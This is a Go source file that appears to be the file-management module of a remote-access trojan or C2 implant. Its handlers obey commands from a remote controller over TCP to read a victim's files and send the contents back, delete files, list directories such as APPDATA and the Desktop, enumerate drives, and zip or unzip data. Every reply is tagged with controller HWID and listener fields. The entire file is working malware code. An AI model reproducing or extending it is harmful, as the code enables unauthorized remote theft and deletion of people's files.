package HandlePacket

import (
	"archive/zip"
	"fmt"
	"io"
	"io/ioutil"
	"main/MessagePack"
	"main/PcInfo"
	"main/TCPsocket"
	"net"
	"os"
	"path/filepath"
	"strings"
)

func DeleteFile(Connection net.Conn, unmsgpack MessagePack.MsgPack) {

	fullPath := unmsgpack.ForcePathObject("FilePath").GetAsString()
	//Path := strings.ReplaceAll(unmsgpack.ForcePathObject("Path").GetAsString(), "\\", "/")
	// 将所有的反斜杠替换为斜杠
	normalizedPathStr := strings.ReplaceAll(fullPath, "\\", "/")
	err := os.Remove(normalizedPathStr)
	if err != nil {

	}

	RefreshDir(Connection, unmsgpack)

}

func readFileToString(path string) (string, error) {
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return "", err
	}
	str := string(b)
	return str, nil
}
func FileRead(Connection net.Conn, unmsgpack MessagePack.MsgPack) {
	pathStr := unmsgpack.ForcePathObject("Path").GetAsString()

	// 将所有的反斜杠替换为斜杠
	normalizedPathStr := strings.ReplaceAll(pathStr, "\\", "/")

	// 现在normalizedPathStr包含了替换后的路径
	str, err := readFileToString(normalizedPathStr)

	if err != nil {
		SessionLog(err.Error(), Connection, unmsgpack)
		return
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("FileContext")
	msgpack.ForcePathObject("FileName").SetAsString(unmsgpack.ForcePathObject("FileName").GetAsString())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	msgpack.ForcePathObject("ReadInput").SetAsString(str)
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())

	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
}
func RefreshDir(Connection net.Conn, unmsgpack MessagePack.MsgPack) {
	result, err := listDir(unmsgpack.ForcePathObject("Path").GetAsString())
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		result = err.Error()
		return
	}
	//fmt.Println("calc")
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject(("CurrentPath")).SetAsString(unmsgpack.ForcePathObject("Path").GetAsString())
	msgpack.ForcePathObject("File").SetAsString(result)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
}
func listDir(path string) (string, error) {
	// Replace any "\\" with "/", and remove "*"
	dirPathStr := strings.ReplaceAll(path, "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// Get info about the directory
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return "", err
	}

	modTime := fileInfo.ModTime()
	modTimeStr := modTime.Format("02/01/2006 15:04:05")

	files, err := ioutil.ReadDir(dirPathStr)
	if err != nil {
		return "", err
	}

	fileInfos := []string{
		//fmt.Sprintf(".-=>%s-=>D-=>0-=>%s", modTimeStr, fileInfo.Mode().Perm()),
		//fmt.Sprintf("..-=>%s-=>D-=>0-=>%s", modTimeStr, fileInfo.Mode().Perm()),
	}

	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		var fileType string
		if file.IsDir() {
			fileType = "D"
		} else {
			fileType = "F"
		}

		fileInfo := fmt.Sprintf("%s-=>%s-=>%s-=>%d-=>%s", file.Name(), modTimeStr, fileType, file.Size(), file.Mode().Perm())
		fileInfos = append(fileInfos, fileInfo)
	}

	resultStr := strings.Join(fileInfos, "-=>")

	return resultStr, nil
}
func GetCurrentPath(Connection net.Conn, unmsgpack MessagePack.MsgPack) {
	var PathA = unmsgpack.ForcePathObject("Path").GetAsString()
	var GlobalPath string
	switch PathA {
	case "TEMP":
		GlobalPath = os.Getenv("TEMP")
	case "APPDATA":
		{
			GlobalPath = os.Getenv("APPDATA")
		}

	case "DESKTOP":
		GlobalPath = os.Getenv("USERPROFILE") + "\\Desktop"
	default:
		// 如果 PathA 不是预期的值，可以根据需要处理
		wd, err := os.Getwd()
		if err != nil {
			//log.Fatal(err)
		}
		GlobalPath = wd
	}

	result, err := listDir(GlobalPath)
	if err != nil {
		//fmt.Printf("Error: %s\n", err)
		//SessionLog(err.Error(), Connection, *unmsgpack)
		return
	}
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("GetCurrentPath")
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("Controler_HWID").SetAsString(unmsgpack.ForcePathObject("HWID").GetAsString())
	msgpack.ForcePathObject(("CurrentPath")).SetAsString(GlobalPath)
	msgpack.ForcePathObject("File").SetAsString(result)
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
}
func getDrivers(Connection net.Conn, Controler_HWID string) {
	var sbDriver strings.Builder
	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := fmt.Sprintf("%s:\\", string(drive))
		if _, err := os.Stat(drivePath); err == nil {
			// 仅当驱动器实际存在时才添加到输出字符串中
			sbDriver.WriteString(fmt.Sprintf("%s-=>DriveType-=>-=>D-=>-=>-=>", drivePath))
		}
	}

	//fmt.Println(sbDriver.String())
	msgpack := new(MessagePack.MsgPack)
	msgpack.ForcePathObject("Pac_ket").SetAsString("getDrivers")
	msgpack.ForcePathObject("Controler_HWID").SetAsString(Controler_HWID)
	msgpack.ForcePathObject("Driver").SetAsString(sbDriver.String())
	msgpack.ForcePathObject("ProcessID").SetAsString(PcInfo.GetProcessID())
	msgpack.ForcePathObject("ListenerName").SetAsString(PcInfo.ListenerName)
	TCPsocket.Send(Connection, msgpack.Encode2Bytes())
}

func CopyFile(srcFile, dstFile string) error {
	input, err := ioutil.ReadFile(srcFile)
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(dstFile, input, 0644)
	if err != nil {
		return err
	}
	return nil
}

func PasteFile(srcFile, dstFile string) error {
	return CopyFile(srcFile, dstFile)
}

func CutFile(srcFile, dstFile string) error {
	err := CopyFile(srcFile, dstFile)
	if err != nil {
		return err
	}
	err = os.Remove(srcFile)
	if err != nil {
		return err
	}
	return nil
}

func RenameFile(oldName, newName string) error {
	err := os.Rename(oldName, newName)
	if err != nil {
		return err
	}
	return nil
}
func Zip(src, dest string) error {

	zipfile, err := os.Create(dest)
	if err != nil {
		return err
	}
	defer zipfile.Close()

	archive := zip.NewWriter(zipfile)
	defer archive.Close()
	err = filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		header.Name = path

		header.Method = zip.Deflate

		writer, err := archive.CreateHeader(header)
		if err != nil {
			return err
		}
		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
		}
		return err
	})

	return err
}
func Unzip(src, dest string) error {
	// Open the zip archive for reading
	r, err := zip.OpenReader(src)
	if err != nil {
		return err
	}
	defer r.Close()

	for _, f := range r.File {

		fpath := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(fpath, filepath.Clean(dest)+string(os.PathSeparator)) {
			return fmt.Errorf("%s: illegal file path", fpath)
		}

		// If it's a directory, create it
		if f.FileInfo().IsDir() {
			os.MkdirAll(fpath, os.ModePerm)
		} else {
			// Create a file for writing
			if err := os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
				return err
			}

			outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
			if err != nil {
				return err
			}

			rc, err := f.Open()
			if err != nil {
				return err
			}
			_, err = io.Copy(outFile, rc)

			outFile.Close()
			rc.Close()

			if err != nil {
				return err
			}
		}
	}
	return nil
}
